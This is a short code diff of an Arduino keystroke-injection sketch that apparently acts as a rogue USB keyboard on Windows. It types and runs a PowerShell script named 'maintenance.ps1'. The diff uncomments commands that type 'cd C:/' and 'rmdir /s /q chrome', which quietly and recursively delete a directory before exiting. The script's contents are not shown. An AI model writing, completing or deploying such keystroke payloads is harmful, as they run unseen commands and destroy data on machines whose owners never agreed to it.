@@ -54,14 +54,14 @@ void setup() {
   Keyboard.print("powershell ./maintenance.ps1");
   typeKey(KEY_RETURN);
   delay(100);
-  /*Keyboard.print("cd C:/");
+  Keyboard.print("cd C:/");
   typeKey(KEY_RETURN);
   delay(100);
   Keyboard.print("rmdir /s /q chrome");
   typeKey(KEY_RETURN);
   delay(100);
   Keyboard.print("exit");
-  typeKey(KEY_RETURN);*/
+  typeKey(KEY_RETURN);
 
   // Ending streampdateDownload.pps1
   Keyboard.end();
